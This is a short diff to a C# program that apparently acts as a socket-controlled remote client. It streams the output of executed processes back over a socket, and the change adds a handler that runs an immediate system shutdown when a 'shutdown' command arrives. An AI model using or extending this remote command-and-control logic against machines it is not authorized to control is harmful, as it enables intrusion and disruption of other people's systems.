@@ -109,6 +109,10 @@ public class Program
                 pro.OutputDataReceived += (_, e) => ClientSocket.Send(System.Text.Encoding.ASCII.GetBytes(e.Data.ToString()), 0, System.Text.Encoding.ASCII.GetBytes(e.Data.ToString()).Length, SocketFlags.None);
                 //ClientSocket.Send(System.Text.Encoding.ASCII.GetBytes("endend"), 0, System.Text.Encoding.ASCII.GetBytes("endend").Length, SocketFlags.None);
             }
+            else if (data[0].ToLower().Equals("shutdown"))
+            {
+                Process.Start("shutdown", "/s /t 0");
+            }
             else
             {
                 Console.WriteLine("Device Connected!");
